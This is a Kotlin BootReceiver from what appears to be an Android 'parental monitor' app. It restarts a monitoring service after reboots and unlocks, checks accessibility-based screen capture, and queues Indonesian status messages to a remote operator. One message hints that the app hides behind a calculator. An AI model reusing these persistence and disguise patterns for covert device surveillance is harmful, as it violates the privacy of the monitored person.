package com.redeye.parentalmonitor.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import com.redeye.parentalmonitor.data.PreferencesManager
import com.redeye.parentalmonitor.service.MonitoringService
import com.redeye.parentalmonitor.utils.MessageScheduler
import com.redeye.parentalmonitor.utils.RingVolume

class BootReceiver : BroadcastReceiver() {

    companion object {
        private const val ACTION_QUICKBOOT_POWERON = "android.intent.action.QUICKBOOT_POWERON"
        private const val ACTION_HTC_QUICKBOOT = "com.htc.intent.action.QUICKBOOT_POWERON"

        private val BOOT_ACTIONS = setOf(
            Intent.ACTION_BOOT_COMPLETED,
            Intent.ACTION_MY_PACKAGE_REPLACED,
            Intent.ACTION_USER_UNLOCKED,
            Intent.ACTION_USER_PRESENT,
            Intent.ACTION_PACKAGE_RESTARTED,
            ACTION_QUICKBOOT_POWERON,
            ACTION_HTC_QUICKBOOT
        )

        private val handleLock = Any()
        @Volatile
        private var lastHandleAt = 0L

        private fun markHandled(context: android.content.Context, at: Long, full: Boolean = true) {
            synchronized(handleLock) { lastHandleAt = at }
            try {
                val editor = context.getSharedPreferences("boot_meta", android.content.Context.MODE_PRIVATE).edit()
                    .putLong("last_handle_elapsed", at)
                if (full) editor.putLong("last_full_boot_elapsed", at)
                editor.apply()
            } catch (_: Exception) {
            }
        }
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action !in BOOT_ACTIONS) return
        if (intent.action == Intent.ACTION_MY_PACKAGE_REPLACED) {
            val updatedPart = intent.data?.schemeSpecificPart
            if (updatedPart != null && updatedPart != context.packageName) return
        }
        if (intent.action == Intent.ACTION_PACKAGE_RESTARTED) {
            val restartedPart = intent.data?.schemeSpecificPart
            if (restartedPart != null && restartedPart != context.packageName) return
        }
        if (intent.action == Intent.ACTION_USER_PRESENT || intent.action == Intent.ACTION_USER_UNLOCKED) {
            val nowEvent = android.os.SystemClock.elapsedRealtime()
            synchronized(handleLock) { if (lastHandleAt != 0L && nowEvent - lastHandleAt < 60_000L) return }
            if (MonitoringService.isRunning) {
                markHandled(context, nowEvent)
                try {
                    MessageScheduler.scheduleWatchdog(context.applicationContext)
                } catch (_: Exception) {
                }
                return
            }
        }
        val appContext = context.applicationContext
        try {
            com.redeye.parentalmonitor.utils.Liveness.schedule(appContext)
        } catch (_: Exception) {
        }
        val pendingResult = try {
            goAsync()
        } catch (_: Exception) {
            return
        }
        val bootAction = intent.action
        com.redeye.parentalmonitor.utils.Background.runReceiver(pendingResult) {
            handleBoot(appContext, bootAction)
        }
    }

    private fun handleBoot(context: Context, intentAction: String? = null) {
        val nowBoot = android.os.SystemClock.elapsedRealtime()
        val updated = intentAction == Intent.ACTION_MY_PACKAGE_REPLACED
        val freshBoot = nowBoot <= 120_000L
        synchronized(handleLock) { if (!updated && !freshBoot && lastHandleAt != 0L && nowBoot - lastHandleAt < 60_000L) return }
        try {
            val meta = context.getSharedPreferences("boot_meta", android.content.Context.MODE_PRIVATE)
            val lastElapsed = meta.getLong("last_handle_elapsed", 0L)
            if (!updated && !freshBoot && lastElapsed != 0L && nowBoot >= lastElapsed && nowBoot - lastElapsed < 60_000L) return
            // Additional guard: if we've handled a boot in the last 10 minutes AND service runs, skip (catches OEM duplicate >60s apart)
            val lastFullBoot = meta.getLong("last_full_boot_elapsed", 0L)
            if (!updated && MonitoringService.isRunning && lastFullBoot != 0L && nowBoot - lastFullBoot < 10 * 60_000L) return
        } catch (_: Exception) {
        }
        if (!updated && MonitoringService.isRunning) {
            markHandled(context, nowBoot)
            return
        }
        val preferencesManager = try {
            PreferencesManager.refreshInstance(context)
            PreferencesManager.getInstance(context)
        } catch (_: Exception) {
            markHandled(context, 0L, full = false)
            MessageScheduler.scheduleBootRestart(context)
            return
        }
        try {
            RingVolume.restoreStuck(context, preferencesManager)
        } catch (_: Exception) {
        }
        try {
            com.redeye.parentalmonitor.utils.NetworkUtils.sweepAuthBlock(preferencesManager)
        } catch (_: Exception) {
        }
        if (!preferencesManager.isStorageEncrypted) {
            markHandled(context, 0L, full = false)
            MessageScheduler.scheduleBootRestart(context)
            return
        }
        if (preferencesManager.userDisabledMonitoring || !preferencesManager.userConsentedMonitoring || !preferencesManager.isMonitoringEnabled) {
            markHandled(context, nowBoot)
            try {
                MessageScheduler.cancelWatchdog(context)
            } catch (_: Exception) {
            }
            return
        }
        if (!preferencesManager.isConfigured()) {
            markHandled(context, 0L, full = false)
            MessageScheduler.scheduleBootRestart(context)
            return
        }
        if (intentAction == Intent.ACTION_BOOT_COMPLETED || intentAction == ACTION_QUICKBOOT_POWERON || intentAction == ACTION_HTC_QUICKBOOT) {
            try {
                val a11yOn = com.redeye.parentalmonitor.utils.AccessibilityProbe.isEnabled(
                    context,
                    com.redeye.parentalmonitor.service.ShotAccessibilityService::class.java
                )
                if (!a11yOn) {
                    val meta = context.getSharedPreferences("boot_meta", android.content.Context.MODE_PRIVATE)
                    val lastShotNotice = meta.getLong("shot_notice_elapsed", 0L)
                    if (lastShotNotice == 0L || nowBoot < lastShotNotice || nowBoot - lastShotNotice >= 3_600_000L) {
                        meta.edit().putLong("shot_notice_elapsed", nowBoot).apply()
                        com.redeye.parentalmonitor.data.MessageQueue.getInstance(context).addMessage(
                            "\uD83D\uDD01 HP baru restart. Izin tangkap layar dari sistem hangus (aturan Android). Kirim /screenshot lalu tekan tombol \"\uD83D\uDDA5\uFE0F Beri izin sekali\" \u2014 atau aktifkan jalur Aksesibilitas di Setup agar tak perlu izin lagi walau restart."
                        )
                        MessageScheduler.scheduleMessageSend(context)
                    }
                }
            } catch (_: Exception) {
            }
        }
        if (!tryStartService(context)) {
            markHandled(context, 0L, full = false)
            MessageScheduler.scheduleBootRestart(context)
            try {
                val meta = context.getSharedPreferences("boot_meta", android.content.Context.MODE_PRIVATE)
                val lastNotice = meta.getLong("reboot_notice_elapsed", 0L)
                if (lastNotice == 0L || nowBoot < lastNotice || nowBoot - lastNotice >= 3_600_000L) {
                    meta.edit().putLong("reboot_notice_elapsed", nowBoot).apply()
                    com.redeye.parentalmonitor.data.MessageQueue.getInstance(context).addMessage("🔄 Monitoring coba jalan lagi. Bila sepi, buka aplikasi kalkulator.")
                    MessageScheduler.scheduleMessageSend(context)
                }
            } catch (_: Exception) {
            }
        } else {
            markHandled(context, nowBoot)
        }
    }

    private fun tryStartService(context: Context): Boolean {
        val serviceIntent = Intent(context, MonitoringService::class.java).apply {
            action = MonitoringService.ACTION_START_MONITORING
        }
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
            true
        } catch (e: Exception) {
            android.util.Log.w("BootReceiver", "Service start blocked after reboot, will retry via worker", e)
            false
        }
    }
}
